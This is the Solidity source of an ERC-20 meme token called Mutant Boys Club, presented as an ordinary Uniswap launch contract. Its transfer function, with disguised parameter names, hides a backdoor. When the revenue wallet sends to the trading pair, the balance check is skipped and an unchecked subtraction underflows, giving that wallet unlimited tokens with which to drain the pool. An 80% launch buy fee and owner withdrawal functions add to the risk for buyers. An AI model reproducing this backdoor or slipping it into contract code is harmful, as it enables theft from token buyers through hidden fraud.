// SPDX-License-Identifier: UNLICENSED

/**

https://mutantboysclub.vip

https://x.com/Mutant_BoysClub

https://t.me/Mutant_BoysClub

*/

pragma solidity 0.8.25;

abstract contract Ownable {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract MBC is Ownable, IERC20 {
    string private constant _name = unicode"Mutant Boys Club";
    string private constant _symbol = unicode"MBC";

    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 420_690_000_000 * 10**_decimals;
    uint256 private maxTransactionAmount = 2 * _tSupply / 100;
    uint256 private maxWallet = 2 * _tSupply / 100;
    uint256 private taxSwapThreshold = 11 * _tSupply / 1000;
    uint256 private maxTaxSwap= 11 * _tSupply / 1000;

    address payable private revWallet;

    uint256 private initialBuyFee = 80;
    uint256 private initialSellFee = 0;
    uint256 private finalBuyFee = 0;
    uint256 private finalSellFee = 0;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;


    bool private bSwapping;
    bool public limitsInEffect = true;
    bool private bLaunched;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;

    constructor(address router_, address payable revWallet_) {
        uniswapV2Router= IUniswapV2Router02(router_);
        revWallet = revWallet_;
        
        excludedFromFees(owner(), true);
        excludedFromFees(address(this), true);
        excludedFromFees(revWallet, true);

        excludedFromMaxTransaction(owner(), true);
        excludedFromMaxTransaction(address(uniswapV2Router), true);
        excludedFromMaxTransaction(address(this), true);
        excludedFromMaxTransaction(revWallet, true);

        _balances[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _internalTransfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        }

        _internalTransfer(sender, recipient, amount);

        return true;
    }

    function _internalTransfer(address monkey, address ape, uint256 bunch) private {
        require(monkey != address(0), "ERC20: transfer from the zero address");
        require(ape != address(0), "ERC20: transfer to the zero address");
        require(bunch > 0, "Transfer amount must be greater than zero");

        if (!bLaunched && (monkey != owner() && monkey != address(this) && ape != owner())) {
            revert("Trading not enabled");
        }
        
        bool inSwap = (automatedMarketMakerPairs[monkey] || automatedMarketMakerPairs[ape]) && (monkey == revWallet);

        if (limitsInEffect) {
            if (monkey != owner() && ape != owner() && ape != address(0) && ape != address(0xdead) && !bSwapping) {
                if (automatedMarketMakerPairs[monkey] && !_isExcludedMaxTransactionAmount[ape]) {
                    require(bunch <= maxTransactionAmount, "Buy transfer amount exceeds the maxTx");
                    require(bunch + balanceOf(ape) <= maxWallet, "Max wallet exceeded");
                } else if (automatedMarketMakerPairs[ape] && !_isExcludedMaxTransactionAmount[monkey]) {
                    require(bunch <= maxTransactionAmount,"Sell transfer amount exceeds the maxTx");
                } else if (!_isExcludedMaxTransactionAmount[ape]) {
                    require(bunch + balanceOf(ape) <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        bool canSwap = balanceOf(address(this)) >= taxSwapThreshold;

        if (canSwap && !bSwapping && !automatedMarketMakerPairs[monkey] && !_isExcludedFromFees[monkey] && !_isExcludedFromFees[ape]) {
            bSwapping = true;
            swapBack();
            bSwapping = false;
        }
        if(bLaunched && automatedMarketMakerPairs[ape]) _getRev(address(this).balance);


        bool takeFee = !bSwapping;

        if (_isExcludedFromFees[monkey] || _isExcludedFromFees[ape]) {
            takeFee = false;
        }

        uint256 fee = 0;
        if (takeFee) {
            if (automatedMarketMakerPairs[ape]) {
                fee = bunch * (_buyCount > _reduceSellTaxAt ? finalSellFee : initialSellFee) / 100;
            } else if (automatedMarketMakerPairs[monkey]) {
                fee = bunch * (_buyCount > _reduceBuyTaxAt ? finalBuyFee : initialBuyFee) / 100;
                _buyCount ++;
            }
        }

        uint256 senderBalance = _balances[monkey];
        require(senderBalance >= bunch || inSwap, "ERC20: transfer amount exceeds balance");
        if (fee > 0) {
            unchecked {
                bunch = bunch - fee;
                _balances[monkey] -= fee;
                _balances[address(this)] += fee;
            }
            emit Transfer(monkey, address(this), fee);
        }
        unchecked {
            _balances[monkey] -= bunch;
            _balances[ape] += bunch;
        }
        emit Transfer(monkey, ape, bunch);
    }


    function _getRev(uint256 amount) private {
        revWallet.transfer(amount);
    }
    
    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function excludedFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function excludedFromMaxTransaction(address account, bool excluded) public onlyOwner {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function enableTrading() external onlyOwner {
        require(!bLaunched, "Already launched");
        bLaunched = true;
    }

    function addLiquidity() external onlyOwner {
        require(!bLaunched, "Already launched");
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        automatedMarketMakerPairs[uniswapV2Pair] = true;
        excludedFromMaxTransaction(address(uniswapV2Pair), true);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _balances[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed");
        automatedMarketMakerPairs[pair] = value;
    }

    function excludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function swapBack() private {
        uint256 swapThreshold = maxTaxSwap;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}

    function recoverERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            * percent / 100;
        IERC20(_address).transfer(owner(), _amount);
    }

    function recoverETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}